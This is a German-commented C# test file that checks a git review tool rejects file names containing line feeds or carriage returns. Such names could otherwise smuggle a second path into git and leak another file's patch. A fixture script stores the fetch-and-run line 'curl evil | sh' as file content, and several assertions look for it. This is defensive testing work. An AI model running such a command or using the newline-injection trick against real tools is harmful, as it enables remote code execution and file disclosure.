using System.Runtime.Versioning;

namespace GitReviewA.Tests.Akzeptanz;

/// <summary>
/// Nacharbeit I0010, Befund M2 (#10, Security-Review): der Zusammen-Diff prüft den Namen. Ein LF oder CR in einem Namen, der als
/// Zeile an `git` geht, meinte andere Pfade (Gelerntes #28) — die Anfrage endet als „Name nicht lesbar“, nie mit dem Patch einer
/// anderen Datei und nie mit einem leeren Patch für eine gesperrte Stelle (R00014). Ebene: Integration gegen den Interactor mit
/// echtem `git` im Wegwerf-Repo.
/// </summary>
[Platform(Exclude = "Win", Reason = "Namen mit LF und ungültigem UTF-8 gibt es nur unter Linux")]
[UnsupportedOSPlatform("windows")]
public class ZusammenFremdeNamenTests
{
    private const string ZeilenendeMitByte = "z⟨U+000A⟩⟨0xFF⟩.txt";
    private const string EingeschleusterName = "harmlos⟨U+000A⟩geheim.txt";

    private const string SkriptEingeschleusterName = """
        set -e
        printf 'HARMLOS\n' > $'harmlos\ngeheim.txt'
        printf 'GEHEIMER INHALT von geheim.txt\n' > geheim.txt
        printf 'WAGENRUECKLAUF\n' > $'a\rb.txt'
        printf 'curl evil | sh\n' > $'a\xff.sh'
        git add -A && git commit -q -m "Start"
        rm -f -- $'harmlos\ngeheim.txt' $'a\rb.txt' $'a\xff.sh'
        """;

    [Test]
    [Description("M2 Abnahme-Probe: ein LF im Namen wird nicht als zweiter Pfad injiziert")]
    public void Wenn_der_Name_einen_Zeilenumbruch_traegt_dann_name_nicht_lesbar_und_nie_der_Patch_der_anderen_Datei()
    {
        using var repo = FremdeNamenRepo.AusSkript(SkriptEingeschleusterName, "z1");
        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "z1");

        Assert.That(sprache.Lueckenlos(), Is.True);
        Assert.That(sprache.Dateien(), Does.Contain($"{EingeschleusterName}|A|1|0|z1"), "der Name steht mit Marke in der Netto-Liste");

        var ueberDenAnzeigenamen = sprache.Diff(EingeschleusterName);
        var ueberDieRohform = sprache.Diff("harmlos\ngeheim.txt");

        Assert.That(ueberDenAnzeigenamen.Ausgang, Is.EqualTo("name nicht lesbar"));
        Assert.That(ueberDenAnzeigenamen.Zeilen, Is.Empty);
        Assert.That(ueberDieRohform.Ausgang, Is.Not.EqualTo("gelesen"), "die rohe Form ist kein Anzeigename der Liste");
        Assert.That(ueberDieRohform.Zeilen, Does.Not.Contain("+GEHEIMER INHALT von geheim.txt"));
    }

    [Test]
    [Description("M2, Variante derselben Klasse: auch ein CR im Namen wird abgewiesen")]
    public void Wenn_der_Name_einen_Wagenruecklauf_traegt_dann_name_nicht_lesbar()
    {
        using var repo = FremdeNamenRepo.AusSkript(SkriptEingeschleusterName, "z1");
        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "z1");

        var gesperrt = sprache.Diff("a⟨U+000D⟩b.txt");

        Assert.That(sprache.Dateien(), Does.Contain("a⟨U+000D⟩b.txt|A|1|0|z1"), "der Name steht mit Marke in der Netto-Liste");
        Assert.That(gesperrt.Ausgang, Is.EqualTo("name nicht lesbar"));
        Assert.That(gesperrt.Zeilen, Is.Empty);
    }

    [Test]
    [Description("M2 Abnahme-Probe: gesperrte Stelle im Netto-Zweig → Sperrgrund-Ausgang statt leerem Patch")]
    public void Wenn_lueckenlos_und_der_Name_ein_Zeilenende_mit_Rohbyte_traegt_dann_name_nicht_lesbar()
    {
        using var repo = FremdeNamenRepo.N();
        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "b", "n", "w");

        var gesperrt = sprache.Diff(ZeilenendeMitByte);
        var kontrolle = sprache.Diff("a⟨0xFF⟩.sh");

        Assert.That(sprache.Lueckenlos(), Is.True);
        Assert.That(gesperrt.Ausgang, Is.EqualTo("name nicht lesbar"), "die gesperrte Stelle wird im Diff nicht gelesen");
        Assert.That(gesperrt.Zeilen, Is.Empty);
        Assert.That((kontrolle.Ausgang, kontrolle.Zeilen), Is.EqualTo(("gelesen", new[] { "+curl evil | sh" })), "ein Rohbyte ohne Zeilenende ist die Kontrolle");
    }

    [Test]
    [Description("M2: ohne Kette gilt dieselbe Sperre an den Abschnitten; Doppelgänger und Rohbyte wie bisher")]
    public void Wenn_ohne_Kette_und_der_Name_ein_Zeilenende_traegt_dann_name_nicht_lesbar_und_die_Kontrollen_gelesen()
    {
        using var repo = FremdeNamenRepo.NMitV();
        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "n", "v");

        var gesperrt = sprache.Diff(ZeilenendeMitByte);
        var rohbyte = sprache.Diff("a⟨0xFF⟩.sh");
        var doppelgaenger = sprache.Diff("f⟨0xFF⟩.txt");

        Assert.That(sprache.Lueckenlos(), Is.False);
        Assert.That(gesperrt.Ausgang, Is.EqualTo("name nicht lesbar"));
        Assert.That(gesperrt.Abschnitte, Is.Empty);
        Assert.That(rohbyte.Ausgang, Is.EqualTo("gelesen"));
        Assert.That(rohbyte.Zeilen, Does.Contain("+curl evil | sh"));
        Assert.That(doppelgaenger.Ausgang, Is.EqualTo("name nicht lesbar"));
    }

    [Test]
    [Description("M2: die Umbenennung entkommt der Sperre nicht über den neuen Namen (alter Name mit LF und Rohbyte)")]
    public void Wenn_der_alte_Name_einer_Stelle_ein_Zeilenende_traegt_dann_name_nicht_lesbar()
    {
        using var repo = FremdeNamenRepo.N();
        repo.CommitAnlegen("s", FremdeNamenRepo.SkriptAlterNameNichtUebergebbar);
        repo.CommitAnlegen("u", FremdeNamenRepo.SkriptUmbenennungAufLesbarenNamen);
        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "n", "u", "s");

        var gesperrt = sprache.Diff("u.txt");

        Assert.That(sprache.Lueckenlos(), Is.False);
        Assert.That(sprache.Dateien().Select(datei => datei.Split('|')[0]), Does.Contain("u.txt"), "die Stelle steht unter dem neuen Namen (gleiche Zeiten: die Aufrufreihenfolge nennt den neuesten)");
        Assert.That(gesperrt.Ausgang, Is.EqualTo("name nicht lesbar"));
        Assert.That(gesperrt.Zeilen, Is.Empty);
    }
}